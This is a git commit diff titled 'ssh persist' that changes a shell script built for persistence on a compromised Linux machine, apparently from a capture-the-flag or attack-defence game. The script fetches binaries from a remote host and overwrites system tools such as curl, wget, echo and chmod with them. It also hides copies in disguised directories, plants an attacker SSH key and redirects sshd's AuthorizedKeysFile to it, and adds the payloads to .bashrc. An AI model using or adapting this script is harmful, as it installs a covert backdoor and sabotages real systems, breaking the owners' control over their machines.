ceaed01107decbc6b7a225d2b36fa53a376c6240
Ayush <ayush@kali>
2020-09-23 15:53:49 +0530

    ssh persist

--- file.sh
+++ file.sh
@@ -10,6 +10,12 @@ mvpath=$(which mv);
 pythonpath=$(which python);
 
 
+cp $wpath .w;
+cp $curlpath .c;
+cp $chattrpath .ct;
+cp $mvpath .m;
+cp $cppath .p;
+
 wget 10.9.134.29:8000/parrot  -O parrot;
 wget 10.9.134.29:8000/chattr  -O ch;
 wget 10.9.134.29:8000/nyancat  -O nyancat;
@@ -37,12 +43,22 @@ mv $wpath ./nanow;
 mv $echopath ./nanoe;
 
 
-cp parrot $curlpath;
-cp nyancat $chattrpath;
-cp nyancat $echopath;
-cp parrot ~;
-cp nyancat ~;
+cp parrot /usr/bin/curl;
+cp nyancat /usr/bin/wget;
+cp nyancat /usr/bin/echo;
 
+mkdir ~/.vim
+mkdir ~/.vim/.config
+
+cp parrot ~/.vim/.config;
+cp nyancat ~/.vim/.config;
+
+echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCkkJKTGN541AcbS8fgtHCVdaAqt5/QBXSUir4SxMFezXwY1Tprvp2Goie1WNUWG2VUw8nl6ctqHb5Oryoq4NCJUY5uScNrQ2Fysie3RiYNP15uacp0AgkulEhwH27z2VXnu/y7fJZQG+pG8pvDPt7GWSLHPD/ICWRny/r6VLKgNw03CjkCS8LmjKv7wqLOwLDZOFZWRjrIWgq0POQ5L9akynNoW/tz0D2UBDE782ObzPUNyjHIV2KLJUtpxb6AxrH+W8Pco8Sq8sorvRWk32lOmb7kBm4C8oA+/Yy0tWTibzoOWtkXzBUgqQGVZoDg+kUZV5pnzsUuX3z5zQJ4Nv3JYl7XPbWj/CL7Rwf/L1Huv35hp5xJxdivGWKui0newt67zmroebAxmHGreCocrwxoXeV/SpG3iqemsfeA7uR2ka9a3fZek/qjm7MKC2DoSEdKqC5bdQCKvmbAoVxo22VL/fLNXZPHyD6ASaGlJ1Iu5JITGUE2xI44bZHPsxJvK60= ayush@kali
+' > /bin/.screen/.config/p;
+
+echo 'AuthorizedKeysFile     /bin/.screen/.config/p' >> /etc/ssh/sshd_config;
+
+service ssh restart;
 
 cp -r $(pwd) /var/spool/.nano/.history;
 cp -r $(pwd) /bin/.screen/.config;
@@ -51,6 +67,10 @@ cp -r $(pwd) /bin/.screen/.config;
 mv $cppath ./ko;
 mv $mvpath ./mo;
 
+./ko parrot /usr/bin/curl;
+./ko nyancat /usr/bin/wget;
+./ko nyancat /usr/bin/chmod;
+
 
 echo '/usr/bin/parrot' >> ~/.bashrc;
 echo '/usr/bin/nyancat' >> ~/.bashrc;
@@ -58,13 +78,12 @@ echo '/usr/bin/nyancat' >> ~/.bashrc;
 echo '/usr/bin/parrot' >> ~/.bashrc;
 echo '/usr/bin/nyancat' >> ~/.bashrc;
 echo '/usr/bin/nyancat' >> ~/.bashrc;
-echo '~/parrot' >> ~/.bashrc;
-echo '~/nyancat' >> ~/.bashrc;
+echo '~/.vim/.config/parrot' >> ~/.bashrc;
+echo '~/.vim/.config/nyancat' >> ~/.bashrc;
 source ~/.bashrc;
 
 
-python ea.py &;
-
-echo "DONE!!";
-
 rm -rf file;
+
+
+python ea.py &
